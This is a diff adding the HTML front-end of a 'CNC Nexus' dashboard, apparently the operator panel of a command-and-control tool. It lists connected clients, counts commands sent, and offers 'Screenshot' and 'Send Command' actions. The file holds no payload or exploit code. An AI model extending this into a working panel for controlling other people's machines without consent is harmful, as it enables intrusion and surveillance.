@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>CNC Nexus Dashboard</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <link rel="stylesheet" href="/static/css/style.css">
+    <script src="https://cdn.socket.io/4.5.4/socket.io.min.js"></script>
+</head>
+<body>
+    <div id="stars"></div>
+    <div id="stars2"></div>
+    <div id="stars3"></div>
+
+    <div class="dashboard-container">
+        <!-- Sidebar Navigation -->
+        <nav class="sidebar">
+            <div class="sidebar-header">
+                <h1 class="sidebar-title">CNC<span class="title-accent">NEXUS</span></h1>
+            </div>
+            <ul class="nav-menu">
+                <li><a href="#" class="nav-link active" data-tab="clients"><i class="fas fa-satellite-dish"></i><span>Clients</span></a></li>
+                <li><a href="#" class="nav-link" data-tab="stats"><i class="fas fa-chart-bar"></i><span>Statistics</span></a></li>
+            </ul>
+            <div class="sidebar-footer">
+                <a href="/logout" class="logout-btn"><i class="fas fa-power-off"></i><span>Logout</span></a>
+            </div>
+        </nav>
+
+        <!-- Main Content -->
+        <main class="main-content">
+            <!-- Clients Tab -->
+            <div class="tab-content active" id="clients-tab">
+                <div class="header-bar">
+                    <h2><i class="fas fa-satellite-dish"></i> Connected Clients</h2>
+                </div>
+                <div class="clients-grid" id="clients-grid">
+                    <!-- Client cards will be dynamically inserted here -->
+                </div>
+            </div>
+
+            <!-- Statistics Tab -->
+            <div class="tab-content" id="stats-tab">
+                <div class="header-bar">
+                    <h2><i class="fas fa-chart-bar"></i> System Statistics</h2>
+                </div>
+                <div class="stats-grid">
+                    <div class="stat-card">
+                        <h3>Total Clients</h3>
+                        <p id="stat-total-clients">0</p>
+                    </div>
+                    <div class="stat-card">
+                        <h3>Online</h3>
+                        <p id="stat-online-clients">0</p>
+                    </div>
+                    <div class="stat-card">
+                        <h3>Commands Sent</h3>
+                        <p id="stat-commands-sent">0</p>
+                    </div>
+                    <div class="stat-card">
+                        <h3>Success Rate</h3>
+                        <p id="stat-success-rate">N/A</p>
+                    </div>
+                </div>
+            </div>
+        </main>
+    </div>
+
+    <!-- Context Menu -->
+    <div id="context-menu" class="context-menu">
+        <div class="context-item" onclick="contextAction('view')"><i class="fas fa-eye"></i> View Client</div>
+        <div class="context-item" onclick="contextAction('info')"><i class="fas fa-info-circle"></i> Client Info</div>
+        <hr>
+        <div class="context-item" onclick="contextAction('screenshot')"><i class="fas fa-camera"></i> Screenshot</div>
+        <div class="context-item" onclick="contextAction('command')"><i class="fas fa-terminal"></i> Send Command</div>
+    </div>
+
+    <script src="/static/js/app.js"></script>
+</body>
+</html>
